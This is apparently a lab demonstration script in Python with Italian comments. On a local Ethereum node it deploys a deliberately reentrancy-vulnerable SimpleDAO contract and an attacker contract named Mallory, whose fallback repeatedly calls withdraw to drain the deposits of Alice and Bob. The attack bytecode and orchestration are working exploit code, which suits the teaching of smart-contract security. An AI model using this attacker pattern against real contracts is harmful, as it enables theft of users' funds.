from web3 import Web3
import json

web3 = Web3(Web3.HTTPProvider('http://node:8545'))
if (web3.isConnected()):
    print("Connessione con il nodo riuscita" + "\n")
else:
    print("Connessione con il nodo fallita" + "\n")

simpleDAOInterface = [
	{
		"constant": False,
		"inputs": [
			{
				"name": "to",
				"type": "address"
			}
		],
		"name": "donate",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "to",
				"type": "address"
			}
		],
		"name": "queryCredit",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"name": "credit",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	}
]
simpleDAOInterfaceJS = json.dumps(simpleDAOInterface) 

malloryInterface = [
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "dao",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [],
		"name": "getJackpot",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"name": "addr",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
malloryInterfaceJS = json.dumps(malloryInterface) 

simpleDAOBytecode = "6060604052341561000f57600080fd5b61034b8061001e6000396000f30060606040526004361061006c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062362a951461007157806312065fe01461009f5780632e1a7d4d146100c857806359f1286d146100eb578063d5d44d8014610138575b600080fd5b61009d600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610185565b005b34156100aa57600080fd5b6100b26101d4565b6040518082815260200191505060405180910390f35b34156100d357600080fd5b6100e960048080359060200190919050506101f3565b005b34156100f657600080fd5b610122600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506102bf565b6040518082815260200191505060405180910390f35b341561014357600080fd5b61016f600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610307565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156102bb573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f1925050509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600060205280600052604060002060009150905054815600a165627a7a72305820bc2ca3f23362192ff58a9fce1aefc64d1d2d5f98870d6cd62f88d1958a306e0e0029"
malloryBytecode = "6060604052341561000f57600080fd5b60405160208061040e8339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610352806100bc6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe0146101da5780634162169f146102035780639329066c14610258575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166359f1286d306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561015857600080fd5b6102c65a03f1151561016957600080fd5b505050604051805190506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15156101c457600080fd5b6102c65a03f115156101d557600080fd5b505050005b34156101e557600080fd5b6101ed61026d565b6040518082815260200191505060405180910390f35b341561020e57600080fd5b61021661028c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561026357600080fd5b61026b6102b1565b005b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050509050505600a165627a7a723058204da5565b8642f5e1562de0b07610ebc27622daed9c41d417ae719d1c32ba370e0029"

accounts = web3.eth.accounts
# Set dell'account con il quale farò i deploy
web3.eth.defaultAccount = web3.eth.accounts[0]

# Definisco un oggetto contratto simpleDAO a partire dall'interfaccia e dal bytecode
simpleDAOContract = web3.eth.contract(abi=simpleDAOInterfaceJS, bytecode=simpleDAOBytecode)
# Costruisco la transazione per fare il deploy del contratto simpleDAO
contract_data = simpleDAOContract.constructor().buildTransaction({'from': accounts[0]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_simpleDAO = web3.eth.contract(address=txn_receipt.contractAddress, abi=simpleDAOInterfaceJS)
# Address, balance e functions di SimpleDAO
print("L'account[0] ha pubblicato il contratto SimpleDAO: " + str((contract_simpleDAO.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_simpleDAO.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_simpleDAO.all_functions()) + "\n")

# Alice deposita 1 ether nel contratto simpleDAO investendo su un account
contract_simpleDAO.functions.donate(accounts[2]).transact({'from': accounts[1], 'value': 1000000000000000000})
# Bilancio del contratto simpleDAO
print("Alice investe 1 ether su un account (account[2]) mettendolo in SimpleDAO, il cui bilancio diventa: " 
+ str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

# Bob deposita 1 ether nel contratto simpleDAO investendo su un account
contract_simpleDAO.functions.donate(accounts[4]).transact({'from': accounts[3], 'value': 1000000000000000000})
# Bilancio del contratto simpleDAO
print("Bob investe 1 ether su un account (account[4]) mettendolo in SimpleDAO, il cui bilancio diventa: " 
+ str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

# Definisco un oggetto contratto mallory a partire dall'interfaccia e dal bytecode
malloryContract = web3.eth.contract(abi=malloryInterfaceJS, bytecode=malloryBytecode)
# Costruisco la transazione per fare il deploy del contratto mallory
contract_data = malloryContract.constructor(contract_simpleDAO.address).buildTransaction({'from': accounts[5]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_mallory = web3.eth.contract(address=txn_receipt.contractAddress, abi=malloryInterfaceJS)
# Address, balance e functions di mallory
print("Cindy(accounts[5]) pubblica il contratto Mallory: " + str((contract_mallory.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_mallory.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_mallory.all_functions()) + "\n")

# Cindy attacca investe su contratto mallory
contract_simpleDAO.functions.donate(contract_mallory.address).transact({'from': accounts[5], 'value': 1000000000000000000})
print("Cindy investe 1 ether sul contratto Mallory mettendolo in SimpleDAO, il cui bilancio diventa: " 
+ str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

# Cindy invoca la fallback per avviare l'attacco
print(".........Cindy attacca invocando la fallback.........\n")
contract_mallory.fallback.transact()

print("Bilancio del contratto simpleDAO dopo l'attacco di Cindy: " + str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

print("Bilancio del contratto Mallory dopo l'attacco di Cindy: " + str(web3.eth.getBalance(contract_mallory.address)) + "\n")



